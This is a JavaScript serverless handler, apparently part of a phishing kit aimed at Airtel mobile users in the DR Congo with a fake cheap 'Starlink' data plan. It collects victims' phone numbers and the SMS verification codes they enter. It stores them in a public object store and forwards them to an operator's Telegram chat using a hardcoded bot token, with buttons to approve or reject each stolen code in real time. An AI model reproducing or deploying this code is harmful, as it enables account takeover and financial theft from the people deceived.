const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8045300220';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { sessionId, cloudId, phone, otp, planName, planPrice } = req.body || {};

    if (!sessionId || !otp) {
      return res.status(400).json({ error: 'Paramètres manquants.' });
    }

    const cleanOtp = otp.toString().replace(/\D/g, '').slice(0, 4);
    const cleanPhone = phone ? phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '') : 'Inconnu';
    const targetId = cloudId || sessionId;

    // Update cloud record
    try {
      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${targetId}`);
      if (fetchRes.ok) {
        const record = await fetchRes.json();
        const data = record.data || {};
        data.otp = cleanOtp;
        data.otpStatus = 'pending';
        data.lastUpdated = Date.now();

        await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: record.name || targetId,
            data,
          }),
        });
      }
    } catch (e) {
      console.warn('Error updating OTP in cloud record:', e);
    }

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `👤 <b>Numéro:</b> <code>+243 ${cleanPhone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${targetId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${targetId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${targetId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${targetId}&action=approve_otp`,
        },
      ],
    ];

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: inlineKeyboard,
        },
      }),
    });

    const tgData = await tgRes.json();

    return res.status(200).json({
      success: true,
      sessionId,
      cloudId: targetId,
      status: 'pending',
      telegramResult: tgData,
    });
  } catch (error) {
    console.error('Error in send-otp serverless:', error);
    return res.status(500).json({ error: error.message || 'Internal Server Error' });
  }
}
